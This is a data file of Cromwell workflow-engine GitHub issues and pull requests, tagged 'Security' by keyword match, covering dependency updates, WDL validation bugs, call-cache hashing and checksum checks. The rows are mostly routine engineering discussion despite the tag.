Security,"Updates [org.apache.tika:tika-core](https://tika.apache.org/) from 2.1.0 to 2.2.1. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/00809e6249b134635f71919c17c1c81603beb22d/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (2.1.0).; You might want to review and update them manually.; ```; centaur/src/main/resources/integrationTestCases/hca/HISAT2.wdl; womtool/src/test/resources/inputs/wdl_draft3/smartseq2_single_sample/all.inputs.json; womtool/src/test/resources/validate/wdl_draft3/valid/smartseq2_single_sample/HISAT2.wdl; ```; </details>; <details>; <summary>Ignore future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""org.apache.tika"", artifactId = ""tika-core"" } ]; ```; </details>. labels: library-update, early-semver-minor, semver-spec-minor, old-version-remains, commit-count:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6622:941,validat,validate,941,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6622,1,['validat'],['validate']
Security,"Updates [org.glassfish.jersey.inject:jersey-hk2](https://github.com/eclipse-ee4j/jersey) from 2.32 to 2.39.; [GitHub Release Notes](https://github.com/eclipse-ee4j/jersey/releases/tag/2.39) - [Version Diff](https://github.com/eclipse-ee4j/jersey/compare/2.32...2.39). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/9367739b48d1bae5766674e547f8cdf8a82d318a/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (2.32).; You might want to review and update them manually.; ```; project/Dependencies.scala; scripts/metadata_comparison/test/resources/comparer/papiv1_version3_good.json; scripts/metadata_comparison/test/resources/comparer/papiv2_version3_good.json; scripts/metadata_comparison/test/resources/comparer/version3_comparison_good.csv; ```; </details>; <details>; <summary>Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""org.glassfish.jersey.inject"", artifactId = ""jersey-hk2"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""30 days"" },; dependency = { groupId = ""org.glassfish.jersey.inject"", artifactId = ""jersey-hk2"" }; }]; ```; </details>. labels: library-update, old-version-remains, commit-count:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7064:30,inject,inject,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7064,3,['inject'],['inject']
Security,"Updates com.google.cloud:google-cloud-storage from 2.1.0 to 2.1.6. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/6472b97b3365f2800f4202d1bf6b1d647bd2b0cc/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (2.1.0).; You might want to review and update them manually.; ```; centaur/src/main/resources/integrationTestCases/hca/HISAT2.wdl; project/Dependencies.scala; womtool/src/test/resources/inputs/wdl_draft3/smartseq2_single_sample/all.inputs.json; womtool/src/test/resources/validate/wdl_draft3/valid/smartseq2_single_sample/HISAT2.wdl; ```; </details>; <details>; <summary>Ignore future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""com.google.cloud"", artifactId = ""google-cloud-storage"" } ]; ```; </details>. labels: library-update, semver-patch, old-version-remains",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6520:953,validat,validate,953,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6520,1,['validat'],['validate']
Security,Updates for memory validations.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2031:19,validat,validations,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2031,1,['validat'],['validations']
Security,"Upgrade `getWomBundle` from `Checked` to `IOChecked` and get rid of the `Await.result` in `HttpResolver`. Now, update `WomtoolServiceInCromwellActor` to get rid of the `Future` we create and return the `IO` directly (at least I think that's generally the right idea). This way we won't tie up threads waiting on HTTP import requests and Akka will work the way it's designed. Note that `validateNamespace` looks like it's async already because it's a `IOChecked[ValidatedWomNamespace]`, but it calls `getWomBundle` under the covers.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4652:386,validat,validateNamespace,386,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4652,2,"['Validat', 'validat']","['ValidatedWomNamespace', 'validateNamespace']"
Security,"Use [Apache bench](https://httpd.apache.org/docs/2.4/programs/ab.html) or similar to measure how many requests per second we can handle. To submit the multi-part form, use the `-p` option for a post data file, example contents below. You can generate your own by capturing the network requests Swagger makes.; ```; ------WebKitFormBoundaryRwwHyBadF8e8Mwbp; Content-Disposition: form-data; name=""workflowUrl"". https://firecloud-orchestration.dsde-alpha.broadinstitute.org/ga4gh/v1/tools/anichols:cnv_somatic_pair_workflow/versions/1/plain-WDL/descriptor; ------WebKitFormBoundaryRwwHyBadF8e8Mwbp; Content-Disposition: form-data; name=""workflowType"". WDL; ------WebKitFormBoundaryRwwHyBadF8e8Mwbp; Content-Disposition: form-data; name=""workflowTypeVersion"". draft-2; ------WebKitFormBoundaryRwwHyBadF8e8Mwbp--; ```; In my preliminary testing, throughput was about 15 validations per second of the workflow above. I had `ab` make multiple requests simultaneously with the `-c` option (don't remember the concurrency level though). N.B. the above us a pretty tough scenario - workflow by URL with many HTTP imports. Our production use case uses files, not URLs.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573:865,validat,validations,865,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573,1,['validat'],['validations']
Security,Use best practice YAML parsing. Add security contact to README. [BW-833],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510:36,secur,security,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510,1,['secur'],['security']
Security,"Use case: Once there is support for [optional file localization](https://cromwell.readthedocs.io/en/develop/optimizations/FileLocalization/#the-localization_optional-optimization), presumably every future version of Cromwell (v33 and beyond) will always not localize files as it contains logic to call cache without localization. However, a WDL author would need to to test whether a task w/`optional_localization` enabled for file inputs has the ability to run successfully in both cases of having access to file localization or file streaming. AC: Regardless of whether a file is marked for localization or not, override that logic on the workflow level so the workflow submitter has the option to enforce file localization, even if the WDL author has written the task to be compatible with remote files and the backend supports that functionality.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3798:499,access,access,499,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3798,1,['access'],['access']
Security,Use genomics auth rather than GCS auth for ref disk validation [BT-303],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6361:52,validat,validation,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6361,1,['validat'],['validation']
Security,"Use genomics auth rather than GCS auth for reference and Docker image cache validation. GCS auth can be user service account which will not work for this purpose, see BT-303 for more details.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6361:76,validat,validation,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6361,1,['validat'],['validation']
Security,"Use prefix hints to filter cache hits, not just base aggregation hashes.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4097:65,hash,hashes,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4097,2,['hash'],['hashes']
Security,Use scalaz stuff from WorkflowDescriptor in ValidateActor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/543:44,Validat,ValidateActor,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/543,1,['Validat'],['ValidateActor']
Security,"User reported issue: https://gatkforums.broadinstitute.org/gatk/discussion/12759/womtool-should-tell-me-to-not-use-the-reserved-keyword-output-upon-validate. AC: Ensure that Womtool returns the true cause for an invalid workflow (in this case its using the ""output"" keyword as a variable name instead of a misleading/unrelated(?) error. Testing Criteria: Add a test for certain reserved keywords, such as `input`, `output`, `command` and possibly others to ensure that using them in unexpected ways in a WDL yields the appropriate error.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4031:148,validat,validate,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4031,1,['validat'],['validate']
Security,"Using raw SQL query which uses table join to find match in the prefix hints:. <img src=""https://user-images.githubusercontent.com/16748522/47813043-4d472400-dd20-11e8-9181-49d45fc56425.png"" width=""50%"" height=""50%"">. Legend:; Blue line- the query checks whether a call cache entry exists for the base aggregation hash; Orange line- the query retrieves 1 call cache entry matching the base aggregation hash and input files aggregation hash. Same database as above was used.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434814687:313,hash,hash,313,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434814687,3,['hash'],['hash']
Security,"Using raw SQL query with multiple OR conditions to find match in the prefix hints:. <img src=""https://user-images.githubusercontent.com/16748522/47726893-c6b41900-dc31-11e8-9d33-3120309fb152.png"" width=""50%"" height=""50%"">. Legend:; Blue line- the query checks whether a call cache entry exists for the base aggregation hash; Orange line- the query retrieves 1 call cache entry matching the base aggregation hash and input files aggregation hash. The database against which the queries were executed has following row count (Call Caching related tables):; CALL_CACHING_AGGREGATION_ENTRY: 102543; CALL_CACHING_DETRITUS_ENTRY: 615258; CALL_CACHING_ENTRY: 102543; CALL_CACHING_HASH_ENTRY: 4818285; CALL_CACHING_SIMPLETON_ENTRY: 1011390",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434334361:319,hash,hash,319,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4266#issuecomment-434334361,3,['hash'],['hash']
Security,"Using wom-tool-30.2, the following wdl validates using `java -jar womtool-30.2.jar validate test.wdl` and shows no inputs with `java -jar womtool-30.2.jar inputs test.wdl`. I think this should fail validation because the variable `to_echo` is used without being declared. . ```; workflow test_validation{; # missing variable; #String to_echo; 	call example{ input:; 		to_echo = to_echo; 	}; }. task example{; 	String to_echo; 	; 	command{; 		echo ""${to_echo}""; 	}; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3381:39,validat,validates,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3381,3,['validat'],"['validate', 'validates', 'validation']"
Security,Validate Google Credentials upon instantiation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/313:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/313,1,['Validat'],['Validate']
Security,Validate RuntimeAttributes before starting a call,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/382:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/382,1,['Validat'],['Validate']
Security,Validate assignment and call input expression types,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3641:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3641,1,['Validat'],['Validate']
Security,Validate call-caching config once instead of per-workflow,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5217:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5217,1,['Validat'],['Validate']
Security,Validate checksum for AWS S3 signed URL downloads during localization [BT-257],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6496:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6496,2,"['Validat', 'checksum']","['Validate', 'checksum']"
Security,Validate docker attribute as part of WDL validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2932:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2932,2,"['Validat', 'validat']","['Validate', 'validation']"
Security,Validate endpoint docs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/392:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/392,1,['Validat'],['Validate']
Security,Validate that `query` endpoint reports the archive status of the workflow as `Archived` [BA-6241],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5428:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5428,1,['Validat'],['Validate']
Security,Validate that the same variable name is not used in multiple conditionals,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2232:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2232,1,['Validat'],['Validate']
Security,Validate variable lookups in draft 2 runtime attributes,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3777:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3777,1,['Validat'],['Validate']
Security,Validate workflowId for call cache diff endpoint,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2552:0,Validat,Validate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2552,1,['Validat'],['Validate']
Security,"Validates `cpuMin`, `cpuMax`, `ramMin` and `ramMax` as valid cpu / memory runtime attributes; Maps `cpuMin` and `ramMin` to `cpu` and `memory` (respectively); All the resource requirements are then available in the runtime attributes map for the backend to play with if it wants to / can.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3077:0,Validat,Validates,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3077,1,['Validat'],['Validates']
Security,Validation Endpoint must use ValidateActor with the burden of converting to a StatusCode on itself,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/489:0,Validat,Validation,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/489,2,['Validat'],"['ValidateActor', 'Validation']"
Security,"Validation config validated once per running application and it will be crushed with errors before any workflow runs, if config values are invalid.; CallCaching variable's names changed at MaterializeWorkflowDescriptorActor and MaterializeWorkflowDescriptorActorSpec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5217:0,Validat,Validation,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5217,2,"['Validat', 'validat']","['Validation', 'validated']"
Security,Validation for Float type not matching spec,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4089:0,Validat,Validation,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4089,1,['Validat'],['Validation']
Security,Validation is missing an edge case,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6976:0,Validat,Validation,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6976,1,['Validat'],['Validation']
Security,Validation misses case where nonexistent output is assigned to Array,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2881:0,Validat,Validation,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2881,1,['Validat'],['Validation']
Security,Validation misses unfound interpolation variables,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2209:0,Validat,Validation,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2209,1,['Validat'],['Validation']
Security,"Validation response is ""null""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2883:0,Validat,Validation,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2883,1,['Validat'],['Validation']
Security,Validation shouldn't allow the same input twice,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4621:0,Validat,Validation,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4621,1,['Validat'],['Validation']
Security,Validation sucks: Tell me the input name that wasn't found!,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2211:0,Validat,Validation,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2211,1,['Validat'],['Validation']
Security,Validation tests for validating sub-workflow inputs [womtool],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3565:0,Validat,Validation,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3565,2,"['Validat', 'validat']","['Validation', 'validating']"
Security,ValidationActor returns WorkflowDescriptor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/569:0,Validat,ValidationActor,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/569,1,['Validat'],['ValidationActor']
Security,"Variables in string interpolations do not undergo existence checks, so the following will validate despite `t` not existing:. ```; task foo {; # Shouldn't validate, no 't' defined:; String s = ""I like to drink ${t}""; command {; echo ${s}; }; output {; String out = read_string(stdout()); }; }; ```. EDIT: Simplified the example",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2209:90,validat,validate,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2209,2,['validat'],['validate']
Security,"Via ""the docker"":. ```; [2018-03-03 01:11:21,96] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; { ; ""outputs"": {; ""workflow.cwl.mark_duplicates_metrics_file"": {; ""format"": null,; ""location"": ""/root/cromwell-executions/workflow.cwl/b745d4f8-aa09-402c-b612-fb112fe8d983/call-mark_duplicates_and_sort/execution/mark_dups_metrics.txt"",; ""size"": null,; ""secondaryFiles"": [],; ""contents"": null,; ""checksum"": null,; ""class"": ""File""; },; ""workflow.cwl.final_cram"": {; ""format"": null,; ""location"": ""/root/cromwell-executions/workflow.cwl/b745d4f8-aa09-402c-b612-fb112fe8d983/call-index_cram/execution/final.cram"",; ""size"": null,; ""secondaryFiles"": [""/root/cromwell-executions/workflow.cwl/b745d4f8-aa09-402c-b612-fb112fe8d983/call-index_cram/execution/final.cram.crai"", ""/root/cromwell-executions/workflow.cwl/b745d4f8-aa09-402c-b612-fb112fe8d983/call-index_cram/execution/final.crai""],; ""contents"": null,; ""checksum"": null,; ""class"": ""File""; }; },; ""id"": ""b745d4f8-aa09-402c-b612-fb112fe8d983""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3350#issuecomment-370128184:421,checksum,checksum,421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3350#issuecomment-370128184,2,['checksum'],['checksum']
Security,"WDL tasks localize during JES runs using WDL like so:. ```; task myTask {; File myFileToLocalize; Array[File] otherFilesToLocalize. ...; command <<<; #process ${myFileToLocalize} .... #process ${otherFilesToLocalize sep=""somesep""} ... >>>; ... ```. also, WDL tasks can specify disk size for attached disk to help ensure that there is sufficient disk-space for files like so (in the example a user-configurable setting):. ```; task diskTask {. 	Int diskGB. ..... runtime {; disks: ""local-disk ${diskGB} HDD"". ... ```. It would seem like a good idea to have a special variable to automatic allocation of disk size of localized files. For example instead of the call being like. ```; call diskTask {; input:; ...; diskGB=100; }; ```. or. ```; call diskTask {; input:; ...; diskGB=prepTask.calcDisk; }; ```. or. ```; call diskTask {; input:; ...; diskGB=size(someInputFile); }. ```. that maybe the variable could be like :. ```; call bigTask {; inputs:; fileOne=someFileOfUnknownSize,; fileTwo=anotherFileOfUnknownSize,; diskGB=autoSize()+autoSize()*0.2; }. ```. where ""autoSize"" automatically calculates sizes for files localized and adds them and I did some ""+*"" to add some factor from that (to have space for output files from the run) (in this case 20% of the disk for the output). I wonder about people's thoughts on this?. This Issue was generated from your [forums] ; [forums]: http://gatkforums.broadinstitute.org/firecloud/discussion/9346/idea-for-enhancment-autosize/p1. ---. @lbergelson commented on [Wed Apr 05 2017](https://github.com/broadinstitute/dsde-docs/issues/1928#issuecomment-291881558). 👍 It would be nice to be able to specify memory requirements as a function of input filesize as well... It would be nice to have fine grained access to each input size as well as just the total.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2267:1749,access,access,1749,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2267,1,['access'],['access']
Security,WDL with undeclared variable passes validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3381:36,validat,validation,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3381,1,['validat'],['validation']
Security,WDL->WOM: Nested expressions must be able to access outer values,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2724:45,access,access,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2724,1,['access'],['access']
Security,WM-1963: Validate PRs begin with Jira tags,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7127:9,Validat,Validate,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7127,1,['Validat'],['Validate']
Security,WOMtool validate returns unhelpful fatal error,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6767:8,validat,validate,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6767,1,['validat'],['validate']
Security,WX-1256 Temporarily turn off engine hashing for blob files,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7209:36,hash,hashing,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7209,1,['hash'],['hashing']
Security,WX-1566 Fix Morgan's call cache file hash CPU thrash Cromwell crash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7419:37,hash,hash,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7419,1,['hash'],['hash']
Security,WX-867 Translate crc32c hashes to b64 for getm,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6970:24,hash,hashes,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6970,1,['hash'],['hashes']
Security,"We also ran for a while and got extra `glob` folders in our paths via the workflow options:. ```json; {; ""final_workflow_outputs_dir"": ""xxx"",; ""use_relative_output_paths"": true; }; ```. For anyone running their instances on a fork, or if someone wants to ask the Cromwell devs to see if this is a breaking change, on our instance I briefly tried out modifying [this line](https://github.com/broadinstitute/cromwell/blob/87/engine/src/main/scala/cromwell/engine/workflow/lifecycle/finalization/CopyWorkflowOutputsActor.scala#L124):. ```scala; lazy val truncateRegex = "".*/call-[^/]*/(shard-[0-9]+/)?(cacheCopy/)?(attempt-[0-9]+/)?(execution/)?"".r; ```. to:. ```scala; lazy val truncateRegex = "".*/call-[^/]*/(shard-[0-9]+/)?(cacheCopy/)?(attempt-[0-9]+/)?(execution/)?(glob-[0-9a-f]+/)?"".r; ```. It seemed to work, removing the glob folder from files copied into xxx. However, I ultimately pursued a different implementation. Using a customized external tool, we now only copy outputs reported as `File` or `Directory` by the `/describe` endpoint, which we are already using for validation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5524#issuecomment-2113647854:1078,validat,validation,1078,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5524#issuecomment-2113647854,1,['validat'],['validation']
Security,"We are trying to abort a job in FireCloud using cromwell .21. The workflow appears stuck in submitted state. It appears to have no calls. Is there are race condition that is we abort too soon the job is stuck?. ```; ~/projects/rawls [develop*] $ curl -H ""Authorization: Bearer `gcloud auth print-access-token`"" https://cromwell2.dsde-alpha.broadinstitute.org/api/workflows/v1/b29c0ef3-e988-4d70-8093-bdd1a039170d/status; {; ""status"": ""Submitted"",; ""id"": ""b29c0ef3-e988-4d70-8093-bdd1a039170d""; }(dvoet@wm163-585) 14:55; ~/projects/rawls [develop*] $ curl -H ""Authorization: Bearer `gcloud auth print-access-token`"" https://cromwell2.dsde-alpha.broadinstitute.org/api/workflows/v1/b29c0ef3-e988-4d70-8093-bdd1a039170d/metadata; {; ""submittedFiles"": {; ""inputs"": ""{\""test.hello.name\"":\""subject_HCC1143\""}"",; ""workflow"": ""task hello {\n String? name\n\n command {\n echo 'hello ${name}!'\n }\n output {\n File response = stdout()\n }\n runtime {\n docker: \""ubuntu\""\n }\n}\n\nworkflow test {\n call hello\n}"",; ""options"": ""{\n \""default_runtime_attributes\"": {\n \""zones\"": \""us-central1-c us-central1-f\""\n },\n \""google_project\"": \""broad-dsde-alpha\"",\n \""auth_bucket\"": \""gs://cromwell-auth-broad-dsde-alpha\"",\n \""refresh_token\"": \""cleared\"",\n \""final_workflow_log_dir\"": \""gs://fc-ceb841f8-e512-4f70-831b-eb2c43af9b42/d938c20b-916d-4bd5-a132-533c72a84eb0/workflow.logs\"",\n \""account_name\"": \""test.firec@gmail.com\"",\n \""jes_gcs_root\"": \""gs://fc-ceb841f8-e512-4f70-831b-eb2c43af9b42/d938c20b-916d-4bd5-a132-533c72a84eb0\""\n}""; },; ""calls"": {. },; ""outputs"": {. },; ""id"": ""b29c0ef3-e988-4d70-8093-bdd1a039170d"",; ""inputs"": {. },; ""submission"": ""2017-01-20T16:37:31.589Z""; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1885:255,Authoriz,Authorization,255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1885,4,"['Authoriz', 'access']","['Authorization', 'access-token']"
Security,"We are trying to create a reference disk manifest as mentioned here:; https://github.com/broadinstitute/cromwell/blob/928ad9616bb81cd8948077a1d0319ade6127e521/src/ci/resources/papi_v2_reference_image_manifest.conf. While running the create_image.sh with an input.tsv reflecting our storage (; https://github.com/broadinstitute/cromwell/blob/develop/scripts/reference_disks/create_images.sh ); I get this error:; ```; Checking for existing resources...; Creating images...; DRY RUN to manifest: refdata-disk-image-public-2023-12-19.manifest.conf; {; imageIdentifier: ""projects/xxxxxxx/global/images/refdata-disk-image-public-2023-12-19""; diskSizeGb: 1310; files: [; curl: (22) The requested URL returned error: 401 Unauthorized; create_images.sh: line 128: 16#: invalid integer constant (error token is ""16#""); ```. I am wondering if I can get any help to resolve this. We are trying to get PAPIv2 working, and our workflows expect that a data directory get passed as input to the workflows and bound to the docker image so that the tools have access to them. . Example: ; `rqcfilter2.sh -Xmx${default=""60G"" memory} -da threads=${jvm_threads} ${chastityfilter} jni=t in=${input_files} path=filtered rna=f trimfragadapter=t qtrim=r trimq=0 maxns=3 maq=3 minlen=51 mlf=0.33 phix=t removehuman=t removedog=t removecat=t removemouse=t khist=t removemicrobes=t sketch kapa=t clumpify=t tmpdir= barcodefilter=f trimpolyg=5 usejni=f rqcfilterdata=${database}/RQCFilterData > >(tee -a ${filename_outlog}) 2> >(tee -a ${filename_errlog} >&2)`. Where ${database} would be the base directory containing all the reference data.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7348:1043,access,access,1043,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7348,1,['access'],['access']
